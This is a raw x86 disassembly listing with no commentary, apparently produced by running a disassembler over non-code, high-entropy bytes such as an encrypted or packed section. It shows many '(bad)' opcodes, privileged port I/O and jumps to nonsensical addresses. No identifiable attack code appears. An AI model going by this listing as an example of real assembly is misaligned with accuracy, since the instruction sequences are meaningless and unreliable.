  40c2e9:	popf   
  40c2ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2eb:	cwde   
  40c2ec:	xchg   BYTE PTR [eax],ch
  40c2ee:	push   edi
  40c2ef:	aad    0xc
  40c2f1:	xchg   esp,eax
  40c2f2:	sbb    DWORD PTR [esi+0xe],esi
  40c2f5:	sbb    al,0x16
  40c2f7:	mov    eax,0xf76a756c
  40c2fc:	dec    eax
  40c2fd:	loop   0x40c2ef
  40c2ff:	push   ebx
  40c300:	or     eax,esp
  40c302:	xlat   BYTE PTR ds:[ebx]
  40c303:	or     dh,BYTE PTR [ebx+0x71dcdb23]
  40c309:	sti    
  40c30a:	ds cwde 
  40c30c:	or     eax,0x173ea3c2
  40c311:	sbb    eax,0x592fabc
  40c316:	addr16 jbe 0x40c2ec
  40c319:	or     eax,0xad825901
  40c31e:	outs   dx,DWORD PTR ds:[esi]
  40c31f:	rcr    ecx,0x14
  40c322:	adc    al,0xd1
  40c324:	mov    ds:0x2b191f48,al
  40c329:	sub    eax,0xba2eb0f
  40c32e:	mov    eax,ds:0xc57dd095
  40c333:	add    eax,0xc8752c27
  40c338:	inc    bp
  40c33a:	adc    al,0x41
  40c33c:	(bad)  
  40c33d:	and    al,BYTE PTR [ebx+esi*8]
  40c340:	or     BYTE PTR ds:0x6723d213,ah
  40c346:	mov    DWORD PTR [ebp+0x48050582],0x9e3c1d62
  40c350:	ror    esp,1
  40c352:	jno    0x40c2f6
  40c354:	shl    DWORD PTR [edi+0x732ecfef],1
  40c35a:	into   
  40c35b:	test   DWORD PTR [ebp+0xc47786e],0x4d227764
  40c365:	test   al,0x9
  40c367:	rol    DWORD PTR [eax],cl
  40c369:	fs enter 0x54e8,0x54
  40c36e:	loopne 0x40c390
  40c370:	fidivr DWORD PTR [ebp-0x590f7463]
  40c376:	mov    DWORD PTR [eax-0x66],edi
  40c379:	sti    
  40c37a:	inc    esi
  40c37b:	out    dx,eax
  40c37c:	mov    bl,0x62
  40c37e:	mov    al,BYTE PTR [esi+0x1d]
  40c381:	inc    eax
  40c382:	stos   BYTE PTR es:[edi],al
  40c383:	in     eax,0x5d
  40c385:	dec    edx
  40c386:	pop    esp
  40c387:	mov    al,0xa9
  40c389:	fist   WORD PTR [ecx-0x420127ed]
  40c38f:	cld    
  40c390:	push   esp
  40c391:	jmp    0x40c33e
  40c393:	sub    DWORD PTR [esi-0x4e3e454f],0x542c8dc2
  40c39d:	adc    esp,DWORD PTR [ebp+0x5a47f0f6]
  40c3a3:	cmc    
  40c3a4:	jmp    0x20313211
  40c3a9:	dec    DWORD PTR [esi]
  40c3ab:	sti    
  40c3ac:	mov    esi,0xfe5e599e
  40c3b1:	mov    ch,cl
  40c3b3:	add    ah,BYTE PTR [esi+edx*4+0x27b13baa]
  40c3ba:	jno    0x40c3b0
  40c3bc:	lea    esi,[ecx+0x40]
  40c3bf:	push   cs
  40c3c0:	stos   BYTE PTR es:[edi],al
  40c3c1:	pop    es
  40c3c2:	mov    dl,BYTE PTR [ecx+0x3e55db73]
  40c3c8:	mov    cl,BYTE PTR [edi+0x5fa35e82]
  40c3ce:	xor    al,0x79
  40c3d0:	jl     0x40c43f
  40c3d2:	lea    esp,[edx]
  40c3d4:	out    0x61,eax
  40c3d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3d7:	sub    al,0x44
  40c3d9:	imul   ebp,DWORD PTR [esi+ecx*2],0xf
  40c3dd:	jge    0x40c3e3
  40c3df:	sub    ch,BYTE PTR cs:[esi]
  40c3e2:	out    dx,eax
  40c3e3:	cmp    cl,ch
  40c3e5:	adc    DWORD PTR [edx],ebp
  40c3e7:	lahf   
  40c3e8:	jne    0x40c3c2
  40c3ea:	cs push edx
  40c3ec:	cdq    
  40c3ed:	clc    
  40c3ee:	aad    0xe1
  40c3f0:	and    edx,edi
  40c3f2:	dec    esp
  40c3f3:	push   ecx
  40c3f4:	pop    eax
  40c3f5:	xchg   BYTE PTR [ebx-0x61e0aec3],dh
  40c3fb:	xchg   ecx,eax
  40c3fc:	fld    DWORD PTR [edi]
  40c3fe:	mov    esi,0x12a5dedf
  40c403:	(bad)  
  40c404:	lahf   
  40c405:	clc    
  40c406:	jp     0x40c463
  40c408:	mov    eax,ds:0x7ec5e55d
  40c40d:	fwait
  40c40e:	xor    esp,DWORD PTR [eax+0x56]
  40c411:	add    eax,0xd26b1e95
  40c416:	dec    eax
  40c417:	clc    
  40c418:	sbb    bl,BYTE PTR ds:0xa94be07d
  40c41e:	nop
  40c41f:	retf   0x4fbb
  40c422:	in     eax,0xbe
  40c424:	mov    al,ss:0x67c1298e
  40c42a:	jnp    0x40c48f
  40c42c:	popaw  
  40c42e:	iret   
  40c42f:	in     al,dx
  40c430:	(bad)  
  40c431:	enter  0xf5a,0x11
  40c435:	jnp    0x40c41c
  40c437:	xchg   esp,eax
  40c438:	lock cmp cl,BYTE PTR [esi-0x25a22f68]
  40c43f:	lahf   
  40c440:	mov    edx,0x7cf2e374
  40c445:	sti    
  40c446:	mov    DWORD PTR ds:0x996aa930,edi
  40c44c:	sub    esi,esp
  40c44e:	mov    dh,0x7a
  40c450:	push   0xce221de3
  40c455:	clc    
  40c456:	xchg   ebx,eax
  40c457:	mov    al,ds:0x48c9d0b9
  40c45c:	in     eax,dx
  40c45d:	inc    esi
  40c45e:	call   0xc206c5e2
  40c463:	ss mov esi,0x6db1f6c9
  40c469:	pusha  
  40c46a:	cs inc eax
  40c46c:	outs   dx,DWORD PTR ds:[esi]
  40c46d:	dec    edi
  40c46e:	xchg   edx,eax
  40c46f:	cwde   
  40c470:	cli    
  40c471:	mov    bl,0x98
  40c473:	repnz sar dl,1
  40c476:	sbb    eax,0xa70ba71
  40c47b:	mov    edx,0xb848735a
  40c480:	add    al,ch
  40c482:	push   cs
  40c483:	mov    cs,WORD PTR [esi-0x4ffdfebb]
  40c489:	add    DWORD PTR [esi-0x62efac78],eax
  40c48f:	jg     0x40c469
  40c491:	test   eax,0x1fd07760
  40c496:	mov    fs,WORD PTR [ebp+edi*8-0x773abcd4]
  40c49d:	cld    
  40c49e:	gs push edx
  40c4a0:	cld    
  40c4a1:	add    eax,0xbe3d6c35
  40c4a6:	and    al,BYTE PTR [edx]
  40c4a8:	and    eax,edx
  40c4aa:	mov    gs,ebx
  40c4ac:	push   ss
  40c4ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4ae:	mov    DWORD PTR [ecx+0x45aac048],esp
  40c4b4:	imul   edi,DWORD PTR [esi-0x2c3f7e24],0x36
  40c4bb:	xchg   esi,eax
  40c4bc:	push   edx
  40c4bd:	xor    cl,cl
  40c4bf:	lahf   
  40c4c0:	icebp  
  40c4c1:	push   ds
  40c4c2:	repnz scas eax,DWORD PTR es:[edi]
  40c4c4:	push   eax
  40c4c5:	adc    dh,bh
  40c4c7:	mov    al,0xeb
  40c4c9:	inc    ebx
  40c4ca:	dec    ecx
  40c4cb:	xor    al,0x79
  40c4cd:	fbstp  TBYTE PTR [ecx-0x76]
  40c4d0:	cdq    
  40c4d1:	js     0x40c4cf
  40c4d3:	mov    al,0xc5
  40c4d5:	in     eax,0x8
  40c4d7:	mov    ch,0x7f
  40c4d9:	nop
  40c4da:	adc    eax,0xe2be4b35
  40c4df:	ficomp WORD PTR [edx+ebp*8-0x4c]
  40c4e3:	push   ebp
  40c4e4:	outs   dx,BYTE PTR ds:[esi]
  40c4e5:	sahf   
  40c4e6:	push   cs
  40c4e7:	add    eax,0x84c2898b
  40c4ec:	inc    ebp
  40c4ed:	sbb    BYTE PTR [edx-0x21],0xcb
  40c4f1:	fs xchg edx,eax
  40c4f3:	test   DWORD PTR ds:0x2c531c76,ecx
  40c4f9:	retf   
  40c4fa:	in     eax,0xa4
  40c4fc:	add    esp,DWORD PTR [ecx+0x61]
  40c4ff:	mov    eax,0xeddfe793
  40c504:	push   esi
  40c505:	ficom  WORD PTR [eax-0x766322b5]
  40c50b:	mov    ebx,0x6074a386
  40c510:	imul   edx,DWORD PTR [eax-0x1e],0xffffff9b
  40c514:	hlt    
  40c515:	sub    dh,BYTE PTR [eax-0x13]
  40c518:	fs or  al,0x5e
  40c51b:	imul   ebp,ecx,0x61
  40c51e:	jno    0x40c584
  40c520:	mov    bh,0xc8
  40c522:	in     eax,0xba
  40c524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c525:	sahf   
  40c526:	addr16 jmp 0xdb2fcbd
  40c52c:	imul   ecx,DWORD PTR [esi],0xb65e4e6b
  40c532:	and    eax,0xcc48f476
  40c537:	xchg   edx,eax
  40c538:	aad    0x48
  40c53a:	adc    BYTE PTR [edx],bl
  40c53c:	jae    0x40c507
  40c53e:	mov    ah,0x5
  40c540:	push   ebp
  40c541:	sub    BYTE PTR [ecx],0x11
  40c544:	je     0x40c5b8
  40c546:	dec    esi
  40c547:	push   ds
  40c548:	sub    eax,0xd1752d45
  40c54d:	dec    edx
  40c54e:	fs jae 0x40c582
  40c551:	shl    BYTE PTR [edx+edi*4+0x52],0x54
  40c556:	add    eax,0xd974c66d
  40c55b:	jle    0x40c580
  40c55d:	enter  0x3422,0xc4
  40c561:	jecxz  0x40c57d
  40c563:	pushf  
  40c564:	inc    esp
  40c565:	lods   eax,DWORD PTR ds:[esi]
  40c566:	and    eax,0x65755431
  40c56b:	jo     0x40c53f
  40c56d:	rcr    BYTE PTR [edi-0x6d],1
  40c570:	(bad)  
  40c571:	in     eax,dx
  40c572:	sbb    al,0xf6
  40c574:	sub    dl,BYTE PTR [ecx+0x3d5a792d]
  40c57a:	xchg   ebp,eax
  40c57b:	lahf   
  40c57c:	fisub  DWORD PTR [eax*8+0x732f0cfd]
  40c583:	push   0x3ef656c2
  40c588:	jo     0x40c53b
  40c58a:	xchg   esi,eax
  40c58b:	sub    cl,dl
  40c58d:	f2xm1  
  40c58f:	in     eax,dx
  40c590:	mov    esp,0x7a5320bb
  40c595:	(bad)  
  40c596:	leave  
  40c597:	dec    edi
  40c598:	xchg   esi,eax
  40c599:	retf   
  40c59a:	push   0xffffff8d
  40c59c:	xchg   edi,eax
  40c59d:	xchg   esi,eax
  40c59e:	pop    eax
  40c59f:	or     BYTE PTR [edx+eiz*4],dh
  40c5a2:	inc    edx
  40c5a3:	imul   edi,esp,0x13
  40c5a6:	sahf   
  40c5a7:	or     eax,0x65d82621
  40c5ac:	sub    edi,0xe9ae63da
  40c5b2:	xchg   esi,eax
  40c5b3:	popf   
  40c5b4:	ja     0x40c5cc
  40c5b6:	mov    esi,0xb742927d
  40c5bb:	sbb    ebx,DWORD PTR [edi+0x4b]
  40c5be:	jmp    0x722c:0xaec7e6d5
  40c5c5:	gs scas eax,DWORD PTR es:[edi]
  40c5c7:	imul   DWORD PTR [ecx-0x33]
  40c5ca:	mov    eax,ds:0xfdb98f2
  40c5cf:	jo     0x40c645
  40c5d1:	cld    
  40c5d2:	stos   DWORD PTR es:[edi],eax
  40c5d3:	sub    ch,ch
  40c5d5:	jle    0x40c5a1
  40c5d7:	dec    ebx
  40c5d8:	fcomi  st,st(4)
  40c5da:	xacquire xchg DWORD PTR [edx-0x61],ecx
  40c5de:	mov    al,ds:0xb79a33a7
  40c5e3:	mov    ds:0x5ac05e41,eax
  40c5e8:	mov    edx,DWORD PTR [edx]
  40c5ea:	hlt    
  40c5eb:	mov    WORD PTR [esi],cs
  40c5ed:	mov    ch,0x2b
  40c5ef:	sbb    ch,BYTE PTR ds:0xf7946ad1
  40c5f5:	xlat   BYTE PTR ds:[ebx]
  40c5f6:	push   es
  40c5f7:	push   edx
  40c5f8:	xchg   esp,eax
  40c5f9:	xor    eax,0x723f5259
  40c5fe:	loopne 0x40c629
  40c600:	cmc    
  40c601:	ss pop ebx
  40c603:	ret    0x5040
  40c606:	cld    
  40c607:	or     ah,BYTE PTR [edx-0x1e62f317]
  40c60d:	imul   edx,esi,0xffffff80
  40c610:	sub    al,0xc7
  40c612:	push   ebx
  40c613:	cmp    BYTE PTR [ebx*1-0x5f1d50b7],cl
  40c61a:	mov    ch,0x20
  40c61c:	ss hlt 
  40c61e:	pop    es
  40c61f:	shr    ecx,cl
  40c621:	sub    edx,DWORD PTR [ebp-0x9e3db77]
  40c627:	(bad)  
  40c628:	sbb    ah,ah
  40c62a:	gs add al,0x6e
  40c62d:	jb     0x40c60b
  40c62f:	mov    bh,0xf
  40c631:	sbb    al,0xd4
  40c633:	mov    eax,ds:0x62735705
  40c638:	in     eax,dx
  40c639:	xlat   BYTE PTR ds:[ebx]
  40c63a:	dec    esi
  40c63b:	sbb    esi,DWORD PTR [esi-0x77ec2013]
  40c641:	ret    
  40c642:	add    ebx,DWORD PTR [edx+eax*8]
  40c645:	inc    eax
  40c646:	push   edx
  40c647:	mov    esi,0xf1b0681f
  40c64c:	or     al,0xc5
  40c64e:	xchg   esp,eax
  40c64f:	sbb    BYTE PTR [ecx-0x46],0x3e
  40c653:	ja     0x40c629
  40c655:	mov    esp,0x53a87e54
  40c65a:	inc    esp
  40c65b:	ds out 0x3f,eax
  40c65e:	repz mov ecx,0x41bf7fe6
  40c664:	mov    eax,0x76c99261
  40c669:	test   eax,0xd1d0cbae
  40c66e:	ins    DWORD PTR es:[edi],dx
  40c66f:	je     0x40c670
  40c671:	adc    eax,0xdce45096
  40c676:	jne    0x40c62b
  40c678:	inc    esi
  40c679:	sti    
  40c67a:	jno    0x40c66d
  40c67c:	push   cs
  40c67d:	int    0x2c
  40c67f:	fidiv  WORD PTR es:[esi-0x47]
  40c683:	push   ds
  40c684:	sub    al,0x18
  40c686:	sahf   
  40c687:	jmp    0xaa366ccd
  40c68c:	test   eax,0x10d5fc2f
  40c691:	bound  esi,QWORD PTR [ebp-0x5f5f24b6]
  40c697:	jle    0x40c640
  40c699:	sbb    DWORD PTR [eax+0x73],esp
  40c69c:	adc    BYTE PTR [esi],cl
  40c69e:	iret   
  40c69f:	sub    cl,BYTE PTR [ebp-0x613329b1]
  40c6a5:	cmp    BYTE PTR [eax+0x40bf8e49],0xe3
  40c6ac:	xor    al,0x4c
  40c6ae:	add    BYTE PTR [ecx+0x39bcb6b],0xec
  40c6b5:	and    BYTE PTR cs:[ebx+0x4ccc7fd5],dl
  40c6bc:	fcomip st,st(3)
  40c6be:	push   0xfffffff1
  40c6c0:	sbb    DWORD PTR [edx+ebx*8+0x6cd8a104],0x6ef2d00
  40c6cb:	add    ebp,edi
  40c6cd:	and    BYTE PTR [edi+eax*1-0x5e],cl
  40c6d1:	call   0xe25f:0x83ee2097
  40c6d8:	imul   ebx,DWORD PTR [ebp+0x14083d6e],0xab46cce0
  40c6e2:	mov    edi,0xa7e92601
  40c6e7:	arpl   WORD PTR [ecx-0x70],sp
  40c6ea:	xchg   esp,eax
  40c6eb:	fucomi st,st(5)
  40c6ed:	jge    0x40c6b3
  40c6ef:	cdq    
  40c6f0:	popf   
  40c6f1:	in     eax,dx
  40c6f2:	ficom  DWORD PTR [ebx]
  40c6f4:	rcr    bl,1
  40c6f6:	test   al,0xbf
  40c6f8:	mov    bl,0x2c
  40c6fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6fb:	or     edi,ebp
  40c6fd:	inc    ebp
  40c6fe:	or     edi,DWORD PTR [edi]
  40c700:	inc    esi
  40c701:	xor    esi,DWORD PTR [edx+0x63c8c1a5]
  40c707:	mov    eax,0x67f892b
  40c70c:	fwait
  40c70d:	nop
  40c70e:	outs   dx,DWORD PTR ds:[esi]
  40c70f:	movntq (bad),mm6
  40c710:	out    0xf5,eax
  40c712:	stos   DWORD PTR es:[edi],eax
  40c713:	pop    esi
  40c714:	sbb    DWORD PTR [eax],edi
  40c716:	or     DWORD PTR [ebx+0x1bce525c],edi
  40c71c:	and    al,0x3a
  40c71e:	mov    eax,0xd6a8b168
  40c723:	mov    edx,0x8a5f2331
  40c728:	int3   
  40c729:	in     eax,0x86
  40c72b:	jnp    0x40c763
  40c72d:	fwait
  40c72e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c72f:	bound  edx,QWORD PTR [eax]
  40c731:	gs out dx,al
  40c733:	aaa    
  40c734:	aad    0x92
  40c736:	adc    eax,0x8ecb8b4f
  40c73b:	or     esi,DWORD PTR [esi]
  40c73d:	mov    BYTE PTR [ebp+0x4c],al
  40c740:	daa    
  40c741:	sub    dl,BYTE PTR [ebx+0x79414c2c]
  40c747:	xor    eax,0x32f01f6d
  40c74c:	sbb    ebx,DWORD PTR [ebp+0x5dbbc4c3]
  40c752:	mov    al,0x75
  40c754:	mov    eax,ds:0x53343e7e
  40c759:	shl    DWORD PTR [eax+0x1e40105c],cl
  40c75f:	out    0x15,eax
  40c761:	dec    ecx
  40c762:	in     al,dx
  40c763:	lea    ecx,ds:0x17077b31
  40c769:	mov    al,0xfa
  40c76b:	scas   al,BYTE PTR es:[edi]
  40c76c:	xor    cl,BYTE PTR [eax]
  40c76e:	fstp   DWORD PTR [edx+0x4]
  40c771:	push   edx
  40c772:	mov    esp,DWORD PTR [eax]
  40c774:	push   ecx
  40c775:	outs   dx,DWORD PTR ds:[esi]
  40c776:	leave  
  40c777:	jmp    FWORD PTR ds:0x8edf5e59
  40c77d:	icebp  
  40c77e:	xchg   DWORD PTR [ebx+ecx*1+0x7cd6be9],esp
  40c785:	daa    
  40c786:	jns    0x40c793
  40c788:	mov    esi,0xeac3b816
  40c78d:	mul    eax
  40c78f:	test   al,0xa3
  40c791:	fmul   DWORD PTR cs:[eax-0x31]
  40c795:	xlat   BYTE PTR ds:[ebx]
  40c796:	call   0x6b31:0x886c80ed
  40c79d:	(bad)  
  40c79e:	addr16 aam 0x51
  40c7a1:	jecxz  0x40c761
  40c7a3:	or     eax,0x3a66010a
  40c7a8:	movhlps xmm1,xmm3
  40c7ab:	loopne 0x40c7d0
  40c7ad:	mov    DWORD PTR [ebp-0x4a],edx
  40c7b0:	xor    BYTE PTR ds:[edx-0x5d464f2f],dl
  40c7b7:	pop    eax
  40c7b8:	sub    BYTE PTR [ebp+eiz*8-0x2d],bl
  40c7bc:	push   esp
  40c7bd:	push   0xffffff86
  40c7bf:	xchg   esi,eax
  40c7c0:	lods   al,BYTE PTR ds:[esi]
  40c7c1:	(bad)  
  40c7c2:	pop    eax
  40c7c3:	sub    bh,al
  40c7c5:	cdq    
  40c7c6:	sti    
  40c7c7:	ficomp DWORD PTR [ebx+0x4e]
  40c7ca:	jge    0x40c80a
  40c7cc:	inc    ebx
  40c7cd:	mov    ecx,0x47daa0ff
  40c7d2:	dec    esi
  40c7d3:	fnstenv [edi]
  40c7d5:	mov    dh,0x85
  40c7d7:	mov    ds:0x84a7fc70,al
  40c7dc:	and    BYTE PTR [ebp+0x6a],dl
  40c7df:	sbb    ch,al
  40c7e1:	cld    
  40c7e2:	popa   
  40c7e3:	mov    eax,0x6c87f194
  40c7e8:	xchg   DWORD PTR [ecx+eax*4+0x62],esi
  40c7ec:	add    esp,DWORD PTR [ecx-0x1c]
  40c7ef:	xchg   edi,eax
  40c7f0:	pop    edx
  40c7f1:	lods   al,BYTE PTR ds:[esi]
  40c7f2:	(bad)  ds:0xbe8d7532
  40c7f8:	int    0xa3
  40c7fa:	pop    ecx
  40c7fb:	leave  
  40c7fc:	mov    dl,0x68
  40c7fe:	dec    edi
  40c7ff:	sti    
  40c800:	mov    DWORD PTR [ebx-0xdde682a],edx
  40c806:	push   ecx
  40c807:	ret    0xcdd2
  40c80a:	or     dl,BYTE PTR [ebx]
  40c80c:	mov    DWORD PTR [edi+0x354aa872],edx
  40c812:	test   al,0x27
  40c814:	or     esi,DWORD PTR [ecx-0x48]
  40c817:	sahf   
  40c818:	cwde   
  40c819:	mov    al,0xc5
  40c81b:	mov    DWORD PTR [ebx-0x214c8030],eax
  40c821:	cdq    
  40c822:	or     bh,ah
  40c824:	paddq  mm1,mm5
  40c827:	push   eax
  40c828:	out    0xc6,eax
  40c82a:	mov    bl,0xc1
  40c82c:	push   ecx
  40c82d:	lods   eax,DWORD PTR ds:[esi]
  40c82e:	jb     0x40c804
  40c830:	loopne 0x40c7d9
  40c832:	addr16 popf 
  40c834:	push   ds
  40c835:	or     bh,BYTE PTR [ebx]
  40c837:	xlat   BYTE PTR ds:[ebx]
  40c838:	retf   
  40c839:	fld    TBYTE PTR [esi+0x4f]
  40c83c:	and    DWORD PTR [esi-0x35],ebx
  40c83f:	out    0x69,eax
  40c841:	jle    0x40c7e5
  40c843:	mov    esi,0x238a5929
  40c848:	mov    dh,0xc6
  40c84a:	nop
  40c84b:	jnp    0x40c826
  40c84d:	js     0x40c820
  40c84f:	cmp    dh,BYTE PTR [edx]
  40c851:	dec    ecx
  40c852:	fist   DWORD PTR [edi]
  40c854:	cwde   
  40c855:	test   al,0x3e
  40c857:	lock sbb eax,0x59dbbbde
  40c85d:	icebp  
  40c85e:	dec    ecx
  40c85f:	or     bh,ah
  40c861:	ins    DWORD PTR es:[edi],dx
  40c862:	push   edx
  40c863:	mov    dl,0x8f
  40c865:	inc    ebp
  40c866:	daa    
  40c867:	mov    edi,ebx
  40c869:	inc    edx
  40c86a:	pop    ds
  40c86b:	xchg   ebx,eax
  40c86c:	popf   
  40c86d:	pop    esp
  40c86e:	sbb    al,0xd8
  40c870:	das    
  40c871:	sub    BYTE PTR cs:[esi-0x26],ch
  40c875:	mov    ebx,0xba59de89
  40c87a:	out    dx,eax
  40c87b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c87c:	in     al,0xd7
  40c87e:	das    
  40c87f:	sub    DWORD PTR [ebp+0x7cac0ab6],0xffffffa7
  40c886:	xor    eax,0xe2acea6a
  40c88b:	lods   al,BYTE PTR ds:[esi]
  40c88c:	stos   DWORD PTR es:[edi],eax
  40c88d:	cmp    bh,BYTE PTR [ecx-0x482d9c19]
  40c893:	xchg   ebx,eax
  40c894:	push   0xe710288a
  40c899:	inc    esi
  40c89a:	rcr    ecx,1
  40c89c:	adc    dl,BYTE PTR [edx-0x1e96f924]
  40c8a2:	fst    DWORD PTR gs:[eax]
  40c8a5:	fild   DWORD PTR [edx-0x60]
  40c8a8:	(bad)  
  40c8a9:	xchg   si,ax
  40c8ab:	cmp    ebp,edi
  40c8ad:	dec    eax
  40c8ae:	mov    al,ds:0x6b230a51
  40c8b3:	cli    
  40c8b4:	bnd jmp 0xbd2045de
  40c8ba:	push   cs
  40c8bb:	pop    edi
  40c8bc:	inc    ebx
  40c8bd:	pop    edx
  40c8be:	add    bl,0x12
  40c8c1:	jne    0x40c8d4
  40c8c3:	push   edx
  40c8c4:	mov    WORD PTR [esi+0x61],ss
  40c8c7:	fbld   TBYTE PTR [edx+0x70]
  40c8ca:	mov    DWORD PTR [esi+0x4f081f8d],edi
  40c8d0:	jp     0x40c8da
  40c8d2:	jnp    0x40c8b2
  40c8d4:	mov    ch,dl
  40c8d6:	stos   BYTE PTR es:[edi],al
  40c8d7:	mov    al,ds:0x813d388a
  40c8dc:	jbe    0x40c8a1
  40c8de:	test   eax,0xabb7da60
  40c8e3:	popa   
  40c8e4:	mov    ah,0xff
  40c8e6:	push   ss
  40c8e7:	pop    esp
  40c8e8:	call   ecx
  40c8ea:	sub    DWORD PTR cs:[edi-0x2df125b9],edx
  40c8f1:	sbb    dh,BYTE PTR [esi-0x181cf43d]
  40c8f7:	shl    DWORD PTR [ecx],0x8a
  40c8fa:	add    al,0x7c
  40c8fc:	jmp    0xa4b1:0xae031a65
  40c903:	enter  0xd604,0x49
  40c907:	ds jae 0x40c902
  40c90a:	stc    
  40c90b:	push   0xffffffa3
  40c90d:	fs shl ecx,cl
  40c910:	mov    ebx,0x17d311f
  40c915:	or     BYTE PTR [edi-0x65],bh
  40c918:	xchg   ebp,eax
  40c919:	push   cs
  40c91a:	cdq    
  40c91b:	lahf   
  40c91c:	add    bl,dh
  40c91e:	stos   DWORD PTR es:[edi],eax
  40c91f:	scas   al,BYTE PTR es:[edi]
  40c920:	(bad)  
  40c921:	pop    ebx
  40c922:	loope  0x40c97a
  40c924:	mov    esi,0xc830fa6c
  40c929:	adc    eax,0x717da7bb
  40c92e:	xor    BYTE PTR [edx],dh
  40c930:	popf   
  40c931:	jle    0x40c8f7
  40c933:	lds    ebx,FWORD PTR [ecx+0x45]
  40c936:	mov    edx,0x74f2a7ca
  40c93b:	mov    ds:0xba0dcf78,eax
  40c940:	lahf   
  40c941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c942:	pop    edi
  40c943:	mov    ds:0x87aec541,eax
  40c948:	inc    esp
  40c949:	xor    eax,0xf0c2c3a3
  40c94e:	adc    edx,DWORD PTR [ebp+0x3a4beeb8]
  40c954:	imul   ebx,DWORD PTR [ebp-0x1a08de15],0x987eeb38
  40c95e:	dec    ebx
  40c95f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c960:	bound  ebp,QWORD PTR [edi+0x18eea2a8]
  40c966:	xor    BYTE PTR [eax+0x74],al
  40c969:	inc    ebp
  40c96a:	jb     0x40c96a
  40c96c:	int    0x56
  40c96e:	pop    edi
  40c96f:	jl     0x40c9b5
  40c971:	scas   eax,DWORD PTR es:[edi]
  40c972:	dec    ebx
  40c973:	inc    edx
  40c974:	movd   mm7,DWORD PTR [edi+0x261668d5]
  40c97b:	div    DWORD PTR [ebx-0x3aeeb90e]
  40c981:	into   
  40c982:	inc    esi
  40c983:	imul   ecx,DWORD PTR [eax+0x33211eaa],0x2d
  40c98a:	lahf   
  40c98b:	call   0xb3a6a60a
  40c990:	jg     0x40c9c7
  40c992:	ss es pop eax
  40c995:	loope  0x40c979
  40c997:	sub    eax,esp
  40c999:	ror    BYTE PTR [ecx+ebx*2],1
  40c99c:	add    edx,DWORD PTR [ebp-0x2e]
  40c99f:	xchg   edx,eax
  40c9a0:	dec    esi
  40c9a1:	addr16 jb 0x40c929
  40c9a4:	xor    DWORD PTR [esp+edx*4],ebp
  40c9a7:	stos   BYTE PTR es:[edi],al
  40c9a8:	xor    BYTE PTR [esi],ah
  40c9aa:	(bad)  [ebp+edx*4-0x3674822d]
  40c9b1:	addr16 gs push ebx
  40c9b4:	out    0x5d,eax
  40c9b6:	push   edi
  40c9b7:	xchg   ecx,eax
  40c9b8:	xchg   ebx,eax
  40c9b9:	int    0x50
  40c9bb:	mov    al,0xb1
  40c9bd:	mov    ebx,0xb3f06c1f
  40c9c2:	pushf  
  40c9c3:	std    
  40c9c4:	sbb    ebx,ebp
  40c9c6:	cmp    cl,BYTE PTR ds:0x9b210cda
  40c9cc:	push   eax
  40c9cd:	jno    0x40c9af
  40c9cf:	aad    0x1c
  40c9d1:	add    al,0x44
  40c9d3:	push   ss
  40c9d4:	pop    edi
  40c9d5:	retf   0x18e5
  40c9d8:	add    al,BYTE PTR [ebx+0x1d318769]
  40c9de:	in     al,0x25
  40c9e0:	aaa    
  40c9e1:	ds out 0x84,eax
  40c9e4:	dec    ecx
  40c9e5:	add    al,0xf0
  40c9e7:	jg     0x40c988
  40c9e9:	inc    ebp
  40c9ea:	adc    BYTE PTR [eax+0x12355918],ah
  40c9f0:	test   DWORD PTR [edi+eax*8+0x30],esp
  40c9f4:	cld    
  40c9f5:	jg     0x40c9b1
  40c9f7:	xchg   ecx,eax
  40c9f8:	inc    edi
  40c9f9:	xchg   esp,eax
  40c9fa:	push   0xfaabca0d
  40c9ff:	mov    dh,0x13
  40ca01:	or     ah,bl
  40ca03:	push   cs
  40ca04:	loope  0x40c9c0
  40ca06:	seto   ch
  40ca09:	lea    edi,[ebp+0x558a728b]
  40ca0f:	popa   
  40ca10:	jb     0x40ca8e
  40ca12:	retf   0xf13f
  40ca15:	sub    al,0xfd
  40ca17:	cmp    eax,0x5a6d4906
  40ca1c:	dec    ebx
  40ca1d:	(bad)  
  40ca1e:	fist   DWORD PTR [edx]
  40ca20:	out    dx,al
  40ca21:	ret    0x5814
  40ca24:	pop    esi
  40ca25:	sub    al,BYTE PTR [esi]
  40ca27:	jmp    0x40ca46
  40ca29:	inc    ebp
  40ca2a:	lods   al,BYTE PTR ds:[esi]
  40ca2b:	scas   al,BYTE PTR es:[edi]
  40ca2c:	push   0x77e16b15
  40ca31:	xor    esp,DWORD PTR [edi+0x29f0da3d]
  40ca37:	inc    edi
  40ca38:	imul   ebp,ebx,0xc0be5569
  40ca3e:	ror    cl,0x95
  40ca41:	mov    WORD PTR [edx-0x1042c7c3],?
  40ca47:	push   DWORD PTR [ebp-0x78]
  40ca4a:	jl     0x40ca04
  40ca4c:	cs cli 
  40ca4e:	adc    edi,DWORD PTR [ecx]
  40ca50:	inc    ebp
  40ca51:	lahf   
  40ca52:	(bad)  [ecx-0x5af5e836]
  40ca58:	iret   
  40ca59:	cmp    edi,DWORD PTR [esi-0x6881b3a5]
  40ca5f:	inc    esi
  40ca60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca62:	add    cl,dh
  40ca64:	fwait
  40ca65:	mov    ch,0x5a
  40ca67:	adc    DWORD PTR [esp+edx*1],esi
  40ca6a:	jle    0x40ca69
  40ca6c:	cld    
  40ca6d:	xchg   ebp,eax
  40ca6e:	not    BYTE PTR [edi+esi*1+0x3bd6ec5c]
  40ca75:	xchg   ecx,eax
  40ca76:	mov    BYTE PTR ds:0xa9120eff,dh
  40ca7c:	inc    esi
  40ca7d:	bound  eax,QWORD PTR [ebp-0x3d]
  40ca80:	xlat   BYTE PTR ds:[ebx]
  40ca81:	enter  0xba2,0xe0
  40ca85:	(bad)  
  40ca86:	outs   dx,DWORD PTR ds:[esi]
  40ca87:	cmp    al,0x40
  40ca89:	mov    ds:0x5926c5ac,eax
  40ca8e:	pop    ecx
